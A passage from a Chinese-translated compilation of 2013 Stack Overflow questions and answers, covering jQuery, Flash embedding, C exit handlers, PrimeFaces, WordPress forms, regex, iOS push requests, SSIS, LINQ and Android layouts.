> 时间：2013-03-01T09:42:17.197

或者，您可以使用切换功能。

```
$('.edit').on('click',function(){
   $('#user_adr').toggle();
}); 
```

如果不切换。然后切换的替代方法是这样的。

```
$('.edit').on('click',function(){
if('#user_adr').is('visible'))
    {
         $('#user_adr').show();
    }
    else
    {
         $('#user_adr').hide();
    }
}); 
```

//将显示更改为无

```
$('#yourDivId).attr('display','none'); 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-03-01T09:47:54.670

如果万一有任何其他具有相同类名的 div 编辑上述解决方案可能没有帮助，那么最好将唯一的 id 保留为“更改”

```
<div class="edit"><a class="formtri" id="change" href="#">CHANGE</a>

$("#change").on("click", function(){
$('#user_adr').show();
});    

$("#change").on("click", function(){
$('#user_adr').toggle();
}); 
```

# html - 全屏播放 Flash 视频

> ID：15154584
> 
> 赞同：0
> 
> 时间：2013-03-01T09:38:37.077
> 
> 标签：html, flash

我们正在我们的网站上发布一个视频。视频由 Adob​​e Captivate（.swf 文件）创建。我通过使用对象标签来做到这一点。问题是 Flash 播放器没有全屏选项。所以我们必须使用宽度和高度参数设置 Flash 的大小。但是不可能给出适合所有分辨率的宽度和高度。那么有没有办法给出相对于 PC 分辨率的视频高度？或者有什么办法可以全屏播放flash？顺便说一句，我们正在使用带有 active_x 的 flash player 11.6

**更新** 我已经尝试过你的 swiffit 方法..这是我的代码

```
 <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/html4/strict.dtd">
<html>
    <head>
        <title></title>
        <meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">
        <script type="text/javascript" src="swfobject.js"></script>
<script type="text/javascript" src="swffit.js"></script>

        <script type="text/javascript">
            swfobject.registerObject("myFlashContent", "11.6.0");
                    swffit.fit("myFlashContent", 1000, 590);
        </script>

    </head>
    <body>
        <div>
            <object classid="clsid:D27CDB6E-AE6D-11cf-96B8-444553540000" width="800" height="600" id="myFlashContent">
                <param name="movie" value="D:\desktop\BS demo.swf">
                <!--[if !IE]>-->
                <object type="application/x-shockwave-flash" data="D:\desktop\BS demo.swf" width="800" height="600">
                <!--<![endif]-->
                    <a href="http://www.adobe.com/go/getflashplayer">
                        <img src="http://www.adobe.com/images/shared/download_buttons/get_flash_player.gif" alt="Get Adobe Flash player">
                    </a>
                <!--[if !IE]>-->
                </object>
                <!--<![endif]-->
            </object>
        </div>
    </body>
</html> 
```

但是全屏不起作用..我有什么遗漏吗？我必须更改 swiffit.js 文件中的任何内容吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-09T05:50:35.917

查看您的代码，我发现了一个问题，那就是您似乎忘记了包含允许全屏参数。尝试添加

```
<param name="allowFullScreen" value="true" /> 
```

我以前没有使用 actionscript 的经验，因此我无法帮助您处理 .swf 文件，但我相信您会发现[这篇关于使用全屏模式的文章](http://help.adobe.com/en_US/ActionScript/3.0_ProgrammingAS3/WS2E9C7F3B-6A7C-4c5d-8ADD-5B23446FBEEB.html) 很有用。

# c - C中的退出处理程序

> ID：15154586
> 
> 赞同：3
> 
> 时间：2013-03-01T09:38:44.107
> 
> 标签：c, exception-handling, error-handling

全部，

我想在我的程序中开发一个退出处理程序。

我对C真的很陌生；都是关于在 C 中管理信号的吗？

我如何知道我的程序是否以良好的方式结束？

如果没有，退出时如何获得最大信息？

* * *

## 回答 #1

> 赞同：11
> 
> 时间：2013-03-01T09:45:38.017

1.  C（C89 和 C99 标准）提供[`atexit()`](http://en.cppreference.com/w/c/program/atexit)了*在程序退出时注册要调用的函数*。这与信号无关。与信号处理程序不同，您可以注册多个退出处理程序。退出处理程序的调用顺序与它们注册的顺序相反`atexit()`。

2.  约定是当程序干净退出时，它返回退出状态`0`。这可以通过`return 0`程序中的任何地方`main()`或`exit(0)`任何地方完成。

3.  在 Unix/Linux/POSIX 类型的操作系统（不确定 Windows）中，父进程使用`wait()`系统调用或其变体获取有关子进程的退出状态信息。

**示例：**这是一个简单的程序及其输出来演示`atexit()`：

```
#include <stdlib.h>
#include <stdio.h>

static void exit_handler1(void)
{
    printf("Inside exit_handler1()!n");
}

static void exit_handler2(void)
{
    printf("Inside exit_handler2()!n");
}

int main(int argc, char *argv[])
{
    atexit(exit_handler1);
    atexit(exit_handler2);
    return 0;
} 
```

程序生成的输出：

```
Inside exit_handler2()!
Inside exit_handler1()! 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-01T09:44:52.793

如果我没有弄错，您询问退出时从程序返回结果。您应该使用`exit(x);`函数从程序中返回值。您可以将任何整数值作为参数`x`。并且不要忘记`#include <stdlib.h>`在您的程序启动中使用。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-03-01T09:47:40.933

看这里你会找到你想要的一切： [http ://www.cplusplus.com/reference/cstdlib/exit/](http://www.cplusplus.com/reference/cstdlib/exit/)

我在这里添加了一个新链接看看：

[C（不是 C++）的异常库](https://stackoverflow.com/questions/1410329/exception-libraries-for-c-not-c/1632090)

# jsf - 在页面加载时关闭 p:accordionPanel 的所有选项卡

> ID：15154591
> 
> 赞同：0
> 
> 时间：2013-03-01T09:38:52.660
> 
> 标签：jsf, primefaces, accordion

Accordionpanel 选项卡在第二次移动到页面时不会关闭，即使使用 activeIndex="" 选项卡也只会在第一次移动到页面时关闭。我正在使用 Primefaces 3.5 和 MyFaces 2.1.5。

```
<p:accordionPanel id="accordionServers" style="width:400px" multiple="true" activeIndex="" cache="false" dynamic="true">
<p:tab title="Tab1"></p:tab>
<p:tab title="Tab2"></p:tab>
</p:accordionPanel> 
```

最简单的解决方法是什么？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-10-26T12:53:44.263

尝试这个

```
activeIndex="null" 
```

它工作得很好！

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-04-24T12:50:54.430

activeIndex="-"，在 Primefaces 3.4 中，当 multiple="true"

```
<p:accordionPanel 
    id="accordionServers" 
    style="width:400px" 
    multiple="true" 
    activeIndex="-" 
    cache="false" 
    dynamic="true">
    <p:tab title="Tab1" />
    <p:tab title="Tab2" />
</p:accordionPanel> 
```

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2016-11-07T14:37:05.337

在我的场景中，设置 activeIndex="-1" 或 activeIndex="null" 或 activeIndex="-" 或 activeIndex="" 不起作用。

**我从经理 bean 返回 -1 并且它起作用了。Getter 总是返回 -1 而 setter 什么也不做。**

```
activeIndex="#{managerBean.activeTabIndices}" 
```

ps 我需要所有选项卡最初总是关闭。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2016-04-20T18:35:55.803

您可以使用 JQuery 通过 JavaScript 关闭手风琴的所有选项卡，如下面的代码所示。

```
 for (var i = 0; i< $(".ui-accordion-header").size(); i++) {
        PF('accordionWidgetVarName').unselect(i);
 } 
```

# php - Wordpress 联系表 7 将 POST 变量传递给感谢页面

> ID：15154595
> 
> 赞同：4
> 
> 时间：2013-03-01T09:39:12.360
> 
> 标签：php, wordpress, contact-form-7

我正在尝试使用联系表格 7 将用户重定向到一个新页面，该页面感谢他们并在表格成功填写后提供更多信息。

我怎样才能通过`$_POST[]`变量？我在谷歌上找不到任何东西。

### 编辑：

我还尝试使用表单来预填充 PayPal 立即购买按钮。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-03-01T10:02:10.833

根据`Contact Form 7 documentation`你必须设置一个 JavaScript 动作钩子。通过使用此钩子，您可以指定希望在表单成功提交后运行的 JavaScript 代码。您将在联系表单管理页面的底部找到“附加设置”字段。只需在其中插入以下行：

```
on_sent_ok: "your javascript code;" 
```

如果您愿意，可以使用以下代码重定向到带有变量的新页面，但它会将变量发送到`$_GET`

```
on_sent_ok: "location = 'http://yourdomain.com?myVar=somevalue';" 
```

您可以按如下方式检索变量

```
$myVar = $_GET['myVar']; 
```

[阅读更多](http://contactform7.com/redirecting-to-another-url-after-submissions/)，同时检查[add_query_arg](http://codex.wordpress.org/Function_Reference/add_query_arg)。

# javascript - 使用 jQuery 检测以像素为单位的字体大小

> ID：15154601
> 
> 赞同：28
> 
> 时间：2013-03-01T09:39:22.503
> 
> 标签：javascript, jquery

如何使用 jQuery 检测字体大小？如果我正在使用`em`并且我需要检测以像素为单位的字体大小

```
<h1 style="font-size: 5em">Size of font in pixels?</h1> 
```

* * *

## 回答 #1

> 赞同：39
> 
> 时间：2013-03-01T09:44:39.200

[http://jsfiddle.net/g9uKq/](http://jsfiddle.net/g9uKq/)

为了清楚起见，我给你做了一个小提琴。

```
var size = $("h1").css('font-size'); 
```

* * *

## 回答 #2

> 赞同：10
> 
> 时间：2013-03-01T09:44:40.907

这应该有效：

```
parseInt($("h1").css("font-size")) 
```

* * *

## 回答 #3

> 赞同：4
> 
> 时间：2013-03-01T09:42:24.077

您是否尝试过使用这种方法？

```
var size = $(element).css('font-size'); 
```

* * *

## 回答 #4

> 赞同：3
> 
> 时间：2013-03-01T09:43:07.637

试试这个，

```
function em(input) {
 var emSize = parseFloat($("h1").css("font-size"));
 return (emSize * input);
} 
```

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2013-03-01T09:51:23.553

用于`css()`获取字体大小......这给出了以 px 为单位的大小......所以将它除以 16 应该会给你 in 的值`em`。试试这个

```
 var sizeinem=parseFloat($('h1').css('font-size')) / 16;
 alert(sizeinem); 
```

[在这里](http://jsfiddle.net/bipen/XSjDJ/)摆弄

# c - 打开 .c 文件时自动包含头文件

> ID：15154602
> 
> 赞同：1
> 
> 时间：2013-03-01T09:39:23.820
> 
> 标签：c, unix, gcc, vim, stdio

我想知道这是否可能...

每当我们要编译 C 程序或 C++ 等时，我们都需要在 .c 文件中包含一些像 #include 这样的头文件......

有什么办法可以使任何由某个名称创建的文件.c 将自动包含头文件而无需输入程序...我不确定这是如何工作的...

甚至类似的东西......我使用vim，所以如果我保存任何文件，如ac，（没有在程序中放置#include），vim或gcc，无论哪个，都将其视为.c文件并添加stdio.h文件..我并不是说它应该添加到程序中，但是在编译时它也应该使用 stdio.h 文件...这可能吗...？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-03-01T09:44:33.733

GCC[有](http://linux.die.net/man/1/gcc)`-include`允许你这样做的选项。但是，此功能针对不同的用例，恕我直言，您的建议不是一个好主意。只需在源代码中编写`#include`指令，您只需执行一次。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-01T11:03:28.270

您必须在实现文件中指定的原因`#include`是告诉编译器您真正想要的功能。函数名只是一个名称，尽管某些函数如`fprintf()`可以与特定功能相关联，但其他东西（如`remove()`, `create()`,之类的通用名称如何`trigger()`）当然不能。指定它是**你的**工作，在 C 中，这是通过组合`#include`路径和包含路径来完成的。这在大多数编程语言中都很常见；例如，在 Java 中，您拥有`import`类路径。

因此，将包含排除在外显然是个坏主意。现在，如果您抱怨查找和键入它的工作量，请尝试 Vim 的片段解决方案或使用成熟的 IDE，其中大多数都为此提供了方便的快捷方式。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-03-01T10:18:21.303

使用 sh 脚本，您可以创建一个包含文件名的全局变量。

你可以在使用后`gcc %tmp_file%.c -include %tmp_file%.h`

# report - 测试报告总是由相同的线性图组成

> ID：15154606
> 
> 赞同：0
> 
> 时间：2013-03-01T09:39:43.503
> 
> 标签：report, record, analyzer, grinder

我使用磨床 3.11。我安装了 Grinder Alnalyser "GrinderAnalyzer.V2.b19" 以查看测试运行的最终报告。我运行以下测试 20 次迭代：

```
from net.grinder.script.Grinder import grinder 
from net.grinder.script import Test 
from net.grinder.plugin.http import HTTPRequest 
from java.lang import System 

class TestRunner: 
        def __init__(self): 
                grinder.statistics.delayReports=True 
        def __call__(self): 
                Google() 

request = HTTPRequest()
Test(1, "Google").record(request) 

def Google(): 
        currentTime = System.currentTimeMillis() 
        result = request.GET("http://www.google.com") 
        timeTaken = System.currentTimeMillis() 
        googlet = timeTaken - currentTime 
        grinder.logger.info(" vij google time " + str(googlet)) 
        grinder.statistics.forLastTest.success = True 
```

运行测试后，每秒事务数图是线性图（仅记录一个值的不正确图）。

TPS 图对于我运行的任何测试都是相同的。这可能是什么原因？为什么没有记录所有迭代的响应时间？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-01T23:09:10.020

Grinder Analyzer 需要比您提供的更大的数据集。尝试运行 2000 次迭代，即 20,000 次。否则，如您所见，生成的图表不是很有用。

# regex - 如何在适用的情况下添加前导零？

> ID：15154611
> 
> 赞同：0
> 
> 时间：2013-03-01T09:39:59.260
> 
> 标签：regex, vbscript

如果在字符串中存在没有前导零的有效数字，例如“.5”、“+.5”或“-.5”，如何使用正则表达式匹配这样的模式，然后添加前导零？

说，

```
s=".5x-.3/+.74x1.2" 
```

我希望它是

```
0.5x-0.3/+0.74x1.2 
```

并使用

```
(?!\d)([+-]?)(?!\d)(\.\d+) 
```

作为模式和`$10$2`替换，但为什么它不能提供正确的东西？

PS：我在 Excel 中使用 VBScript RegExp 引擎

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-01T09:48:29.453

```
\B\. 
```

仅当点前面没有数字（或字母）时才匹配点，这应该符合您的要求。将其替换为`0.`

为什么你的正则表达式不起作用？嗯，它说

```
(?!\d)  # Make sure the next letter isn't a digit
([+-]?) # Try to match a sign (which never is a digit, so why the lookahead?)
(?!\d)  # Make sure the next letter isn't a digit (again)
(\.\d+) # Match a dot and digits (the dot also isn't a digit, so again
        # the lookahead is not necessary) 
```

所以，你可以完全放弃第一个前瞻，第二个*前瞻*必须是一个后视才能做你想做的事情（即断言*点**之前* 的字符不是数字），但 ECMAScript 不知道lookbehinds，所以我们必须使用单词边界锚点。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-01T10:01:06.583

~~替换`(?<!\d)\.(?=\d)`为`0.`，假设您的正则表达式风格支持负面的后视。~~

`(?<!\d)`前面*没有数字*（与`\D`wich不同，*前面有一个不是数字的字符，*如果字符串以 开头，则不匹配`.5`），非消耗（负后视）。

`\.`是点（duh），消耗。

`(?=\d)`表示点后面必须*跟一个数字*，非消耗（正向预测）。

唯一消耗的字符是点，因此您只需将其替换为`0.`.

* * *

**编辑**：由于 VBScript 不支持后视，您可以使用稍微复杂的替换`(\D|^)\.(?=\d)`with `$10.`（假设 VBScript 风格不尝试获得第 10 组，而 JavaScript 似乎没有这样做）。该`(\D|^)\.`部分将匹配以字符串开头或任何非数字字符开头的点。前一个字符已被消耗，因此您必须将其放回原处，因此`$1`.

# javascript - 替换 RegExp - 否定模式

> ID：15154613
> 
> 赞同：1
> 
> 时间：2013-03-01T09:40:15.623
> 
> 标签：javascript, regex

我有'contenteditable'的div。我想在这个 div 中过滤字符，什么时候是`[^ą-źa-z0-9\s]`AND NOT ( )，我必须更改颜色字符，不匹配模式。例如，当我得到`$(this).html()`： dfgtąść45 **%$#** tg ss **&** k **;** - 我想更改为红色粗体字符。

JS：

```
var t = $(this).html().replace(/<\/?[^>]+>/gi, '').replace(/\s$/, '&nbsp;');
t = t.replace(/(&nbsp;)[^ą-źa-z0-9\s]/ig,function(match){return '<span style="color: red;">' + match + "</span>";});
$(this).html(t); 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-01T11:09:29.487

这是一种方法

```
t = t.replace( /(&nbsp;)|(?:(?!&nbsp;)[^ą-źa-z0-9\s])+/ig,
    function ( match, nbsp ) {
        return nbsp ? nbsp : '<span style="color: red;">' + match + "</span>";
}); 
```

请注意，虽然不建议以这种方式操作 html：例如，元素属性中与否定字符类匹配的任何字符都将错误地包含在`span`标签中。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-01T11:15:44.320

如果要突出显示与特定模式不匹配的任何内容，可以使用此代码。这比尝试修改正则表达式来否定匹配项更具可扩展性。

```
function unmatches(regex, str, callback) {

    var result = "";
    var lastAppend = 0;

    var arr;
    var nonMatching;

    while ((arr = regex.exec(str)) != null) {
        nonMatching = str.substring(lastAppend, arr.index);

        if (typeof callback === "function") {
            nonMatching = callback(nonMatching);
        }
        // If a function is not supplied, currently, it output back
        // the input string. It can be extended, though.

        result += nonMatching + arr[0];
        lastAppend = arr.index + arr[0].length;

        // In case the global flag is not set
        // There is at most one match without global flag
        if (!regex.global) {
            break;
        }
    }

    nonMatching = str.substring(lastAppend);

    if (typeof callback === "function") {
        nonMatching = callback(nonMatching);
    }

    result += nonMatching;

    return result;
} 
```

以您的案例为例（请注意，我添加了`g`标志）：

```
var result = unmatches(/(&nbsp;)*[ą-źa-z0-9\s]+/g, "dfgtąść45%$#tg&nbsp;ss&k;", function (m) {
    if (m === "") {
        // Non matching part can be empty string
        return m; // Ignore
    } else {
        // The non-empty string case
        return '<span style="color: red;">' + m + '</span>';
    }
}); 
```

# http - POST 到 Urban Airship 推送通知 iOS ASIFormDataRequest

> ID：15154616
> 
> 赞同：1
> 
> 时间：2013-03-01T09:40:20.777
> 
> 标签：http, ios6, asihttprequest, urbanairship.com

我已经在 iOS 上设置了 Urban Airship 推送通知注册和处理，并使用 CURL 终端命令对其进行了测试。但是，我无法使用 ASIFormDataRequest 重现相同的内容。做过这件事的任何人都可以告诉我如何使用 JSON 序列化数据并使用 ASIHTTPRequest 或其他方式发送它吗？

顺便说一句，Urban Airship 无法识别我在他们的 Web 界面上的推送（推送的数量没有增加），但我可以使用这个来验证来自 UA 的响应代码 200：

```
[request setUsername:URBAN_AIRSHIP_APP_KEY];
[request setPassword:URBAN_AIRSHIP_APP_SECRET]; 
```

但我似乎无法将通知发送到设备。

编辑：这是我的代码的样子

```
NSDictionary *paramDict = 
@{
 device_tokens: @[@"mytoken",@"mytoken2"],
 aps: @{alert: @"alertText"},
 extras: @"myExtraParam",
 moreExtras: @"moreExtras"
};

NSData *data = [NSKeyedArchiver archivedDataWithRootObject:paramDict];

   ASIHTTPRequest *request = [ASIHTTPRequest requestWithURL:[NSURL
URLWithString:@"https://go.urbanairship.com/api/push/"]];
   [request setRequestMethod:@"POST"];

   [request appendPostData:data];

   [request setUsername:URBAN_AIRSHIP_APP_KEY];
   [request setPassword:URBAN_AIRSHIP_APP_SECRET];

   [request addRequestHeader:@"Content-Type" value:@"application/json"];

   [request setDelegate:self];
   [request setDidFinishSelector:@selector(pushSucceeded:)];
   [request setDidFailSelector:@selector(pushFailed:)];
   [request startAsynchronous]; 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-17T23:32:16.383

我终于得到了这个工作。我想这是我的 json 序列化的问题。使用 NSJSONSerialization 有效。

这是我的代码，供其他试图让它工作的人使用。

```
 NSError *error;
NSData *jsonData = [NSJSONSerialization dataWithJSONObject:paramDict
                                                   options:0
                                                     error:&error];
if (!jsonData) {
    NSLog(@"JSON error: %@", error);
} else {
    //Do something with jsonData

    ASIFormDataRequest *request = [ASIFormDataRequest requestWithURL:[NSURL URLWithString:@"https://go.urbanairship.com/api/push/"]];

    [request appendPostData:jsonData];

    [request setUsername:URBAN_AIRSHIP_APP_KEY];
    [request setPassword:URBAN_AIRSHIP_APP_SECRET];

    [request addRequestHeader:@"Content-Type" value:@"application/json"];

    [request setDelegate:self];
    [request setDidFinishSelector:@selector(pushSucceeded:)];
    [request setDidFailSelector:@selector(pushFailed:)];
    [request startAsynchronous];
} 
```

* * *

## 回答 #2

> 赞同：-3
> 
> 时间：2013-03-17T00:48:29.533

Urban Airship 有关于将其 SDK 集成到您的代码中的文档。但是这里有一些提示可以帮助您前进。

您应该在应用程序的 AppDelegate 文件中覆盖以下执行类似操作的函数。UAirship 是 Urban Airship SDK 的管理器类。

```
 - (BOOL)application:(UIApplication *)application didFinishLaunchingWithOptions:(NSDictionary *)launchOptions
        {    
                // push notification
                //Init Airship launch options
                NSMutableDictionary *takeOffOptions = [[[NSMutableDictionary alloc] init] autorelease];
                [takeOffOptions setValue:launchOptions forKey:UAirshipTakeOffOptionsLaunchOptionsKey];

                // Create Airship singleton that's used to talk to Urban Airship servers.
                // Please populate AirshipConfig.plist with your info from http://go.urbanairship.com
                [UAirship takeOff:takeOffOptions];
                ...
                }

        - (void)application:(UIApplication *)application didRegisterForRemoteNotificationsWithDeviceToken:(NSData *)deviceToken {
            // Updates the device token and registers the token with UA
            NSLog(@"Registering for Devicetoken");
            [[UAirship shared] registerDeviceToken:deviceToken];

            }        

        - (void)application:(UIApplication *)application didReceiveRemoteNotification:(NSDictionary *)userInfo {
            NSLog(@"Received remote notification: %@", userInfo);

            // possibly throw alert box to show the payload data in the userInfo object.
            }            

        - (void)application:(UIApplication *)application didFailToRegisterForRemoteNotificationsWithError:(NSError *) error {
            NSLog(@"Failed To Register For Remote Notifications With Error: %@", error);
        } 
```

# ssis - 并行开发 SSIS 项目

> ID：15154618
> 
> 赞同：1
> 
> 时间：2013-03-01T09:40:27.667
> 
> 标签：ssis, sql-server-2008-r2, share

在一个由 2 名开发人员组成的团队中，我们必须实现一个包含多个数据流块的 SSIS 包。理想情况下，每个开发人员都将在他的组件集上工作。

是否可以“共享”包并使其可以在不覆盖同事更改的情况下使用相同的解决方案？

将每个开发人员的各个组件复制/粘贴到唯一的最终解决方案中的解决方案也是一种选择。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-03-01T10:45:56.477

并非如此，而且您不能像处理其他类型的文件那样轻松地合并包。

您的情况的解决方案是将您正在执行的工作拆分为单独的子包，然后使用父包来协调执行并使用 The Execute Package Task 调用子包（它还可以设置您可能需要在子包上的任何变量包）

起初听起来很复杂，但它实际上是一个好方法！

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-01T10:46:11.270

合并一个 SSIS 包很困难，有一些工具可以让它更容易。我强烈建议您查看[http://bidshelper.codeplex.com/](http://bidshelper.codeplex.com/)以获得真正有用​​的 SSDT / BIDS 助手插件。

另一种方法是让每个开发人员在单独的包中构建他们的数据流，然后拥有一个主包来控制执行流并调用各个包。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-03-01T11:50:24.980

补充 Diego 的回答：对主包进行整体设计。随着您的进步，开发人员很可能会觉得需要修改父级 - 经常讨论并经常合并以在设计和实现上保持同步。

# c# - 优化 LINQ 查询以进行修剪和删除

> ID：15154622
> 
> 赞同：0
> 
> 时间：2013-03-01T09:40:35.110
> 
> 标签：c#, .net, linq

我有以下查询，它在最后返回一个数组。

```
 orderArray = orderValue.Split(',').Select(x =>
                                               x.Remove(0, x.IndexOf('_') + 1)
                                                        ).
                                     Select(x => x.Trim(quotes)).ToArray(); 
```

但我认为有比使用多项选择更好的方法

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-03-01T09:43:28.617

您可以`Trim`直接申请：

```
orderArray = orderValue.Split(',')
    .Select(x => x.Remove(0, x.IndexOf('_') + 1).Trim(quotes))
    .ToArray(); 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-03-01T09:43:32.270

你可以一口气做`.Select(x =>x.Remove().Trim())`...

# android - android中的iframe问题

> ID：15154626
> 
> 赞同：0
> 
> 时间：2013-03-01T09:40:56.973
> 
> 标签：android, cordova, iframe

嗨，我在我的 android phonegap 应用程序中使用了 iframe。我设置了宽度和高度，并且 iframe 正在滚动。但是 iframe 内的网页被禁用，即。我无法在网页文本框中输入任何内容。

如果我设置滚动=“否”，则 iframe 不会滚动。但我可以输入文本框。

这是我的代码：

```
<iframe src="http://google.com" width="100%" height="200px" scrolling="no"></iframe> 
```

我可以在 iframe 中滚动网页，也应该可以在文本框中输入。请帮我解决这个问题。在此先感谢。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-01T09:58:58.587

检查一次并在您的 onCreate 方法中使用它：

```
Webview.requestFocus(View.FOCUS_DOWN);
    Webview.setOnTouchListener(new View.OnTouchListener() {
        @Override
        public boolean onTouch(View v, MotionEvent event) {
            // TODO Auto-generated method stub
             switch (event.getAction()) {
                case MotionEvent.ACTION_DOWN:
                case MotionEvent.ACTION_UP:
                    if (!v.hasFocus()) {
                        v.requestFocus();
                    }
                    break;
            }
            return false;

        }
    }); 
```

# wpf - WPF 应用程序中的按钮样式在单击后未重置

> ID：15154627
> 
> 赞同：0
> 
> 时间：2013-03-01T09:41:00.490
> 
> 标签：wpf, button, styles

在 WPF 应用程序（.NET 4.5）中，我定义了一个带有如下图像的按钮：

```
<Button Command={Binding RefreshCommand} Style="{StaticResource {x:Static ToolBar.ButtonStyleKey}}">
  <Image Source="refresh.png" />
</Button> 
```

这基本上可以正常工作，即当用户将鼠标悬停在按钮上时，按钮的样式会发生变化。但是，用户单击按钮后样式不会重置。在单击另一个文本框或类似控件之前，“悬停样式”将一直存在。

单击后如何“重置”按钮样式？

# php - Facebook API：创建活动封面图片

> ID：15154628
> 
> 赞同：1
> 
> 时间：2013-03-01T09:41:06.467
> 
> 标签：php, facebook-graph-api, facebook-opengraph

我正在尝试通过 Facebook API 设置新的事件封面图像，但是当我将事件发布到 Facebook 时，我只在左侧设置了旧的小图像。

目前是否可以设置封面图片？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-06-07T00:30:04.063

显然，这可以通过在图形 API 上使用“cover_url”来实现。这是一个类似的 SO 问题： [Facebook Events Cover (Graph API)](https://stackoverflow.com/questions/15034602/facebook-events-cover-graph-api)

# android - 如何让我的布局在多种屏幕尺寸和密度下看起来都一样？

> ID：15154636
> 
> 赞同：1
> 
> 时间：2013-03-01T09:32:50.623
> 
> 标签：android, android-screen-support

这是我的代码：

```
<TextView
    android:id="@+id/timer"
    android:layout_width="wrap_content"
    android:layout_height="wrap_content"
    android:layout_gravity="right"
    android:layout_marginTop="50dp"
    android:textColor="#873670" />

<TextView
    android:id="@+id/questionList"
    android:layout_width="wrap_content"
    android:layout_height="wrap_content"
    android:layout_marginTop="20dp"
    android:textAppearance="?android:attr/textAppearanceLarge"
    android:textColor="#110987" />

    <RadioGroup
        android:id="@+id/rgAns"
        android:layout_width="wrap_content"
        android:layout_height="wrap_content" >

        <RadioButton
            android:id="@+id/rbOpt1"
            android:layout_width="wrap_content"
            android:layout_height="wrap_content"
            android:clickable="true"
            android:onClick="usrAnsrChoice" />

        <RadioButton
            android:id="@+id/rbOpt2"
            android:layout_width="wrap_content"
            android:layout_height="wrap_content"
            android:clickable="true"
            android:onClick="usrAnsrChoice" />

        <RadioButton
            android:id="@+id/rbOpt3"
            android:layout_width="wrap_content"
            android:layout_height="wrap_content"
            android:clickable="true"
            android:onClick="usrAnsrChoice" />
    </RadioGroup>

<LinearLayout
    android:layout_width="match_parent"
    android:layout_height="match_parent"
    android:layout_marginRight="40dp"
    android:orientation="horizontal" >

    <Button
        android:id="@+id/prevQstn"
        android:layout_width="wrap_content"
        android:layout_height="wrap_content"
        android:text="@string/quizPrvBtnLbl" />

    <Button
        android:id="@+id/endTest"
        android:layout_width="wrap_content"
        android:layout_height="wrap_content"
        android:text="@string/quizEndTstBtnLbl" />

    <Button
        android:id="@+id/nextQstn"
        android:layout_width="wrap_content"
        android:layout_height="wrap_content"
        android:text="@string/quizNxtBtnLbl" />

    <TextView
        android:id="@+id/inc"
        android:layout_width="wrap_content"
        android:layout_height="wrap_content"
        android:layout_gravity="right"
        android:layout_marginTop="100dp"
        android:textColor="#ffffff" />

</LinearLayout> 
```

我希望这个屏幕能够自动调整为 4"、5" 和 2" 屏幕。我还希望完全支持 mdpi 和 ldpi 屏幕，并让 7" 屏幕上的一切看起来与 4" 屏幕上的一样。我必须对我的 XML 进行哪些更改以支持这些屏幕尺寸和密度？

现在我的布局在小屏幕上看起来不错，但在大屏幕上却不是那么好。此外，我不希望我的图像被拉伸或我的文本错位。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-03-18T20:51:57.447

要设计在几种不同类型的屏幕上运行良好的布局，您应该为每种屏幕尺寸创建布局文件。这样做的旧方法与 Danny 在他的回答中概述的类似，但不太准确。支持多种屏幕尺寸的旧方式如下：

> **layout-xlarge**：xlarge 屏幕至少为 960dp x 720dp
> **layout-large**：大屏幕至少为 640dp x 480dp
> **layout-normal**：普通屏幕至少为 470dp x 320dp
> **layout-small**：小屏幕至少为 426dp x 320dp

仍然支持这种为不同屏幕尺寸定义布局的方法，但现在建议将此方法替换为以最小屏幕宽度为目标。以屏幕宽度而不是通用尺寸“桶”为目标的原因是，在确定屏幕实际适合哪个桶时有点模棱两可，并且有些设备报告了错误的桶。通过定位屏幕宽度，设备不会再错误地报告其尺寸。

屏幕宽度文件夹将设置如下：

> **layout-sw320dp** : 320dp -> 典型的手机屏幕（240x320 ldpi、320x480 mdpi、480x800 hdpi 等）。
> **layout-sw480dp** : 480dp -> 像[Dell Streak](http://en.wikipedia.org/wiki/Dell_Streak) (480x800 mdpi) 这样的 tweener 平板电脑。
> **layout-sw600dp**：600dp -> 7" 平板电脑（600x1024 mdpi）。
> **layout-sw720dp**：720dp -> 10" 平板电脑（720x1280 mdpi、800x1280 mdpi 等）。

对于您的可绘制资源，您希望以屏幕密度为目标，而不是针对屏幕大小。其基本思想是创建针对`mdpi`密度桶的所有资源，并针对不同的密度缩放可绘制对象。因此，在这种情况下，您的图像资源将具有以下可绘制文件夹：

> **drawable-ldpi**：低密度屏幕
> **drawable-mdpi**：普通或中等密度屏幕
> **drawable-hdpi**：高密度屏幕
> **drawable-xhdpi**：非常高密度的屏幕

可以在[Android Developer Reference](http://developer.android.com/guide/practices/screens_support.html#DesigningResources)上找到更好的解释，并在此处摘录（我添加的密度存储桶名称）：

> **替代绘图**
> 
> 几乎每个应用程序都应该为不同的屏幕密度提供替代的可绘制资源，因为几乎每个应用程序都有一个启动器图标，并且该图标在所有屏幕密度上都应该看起来不错。同样，如果您在应用程序中包含其他位图可绘制对象（例如应用程序中的菜单图标或其他图形），您应该为不同的密度提供替代版本或每个版本。
> 
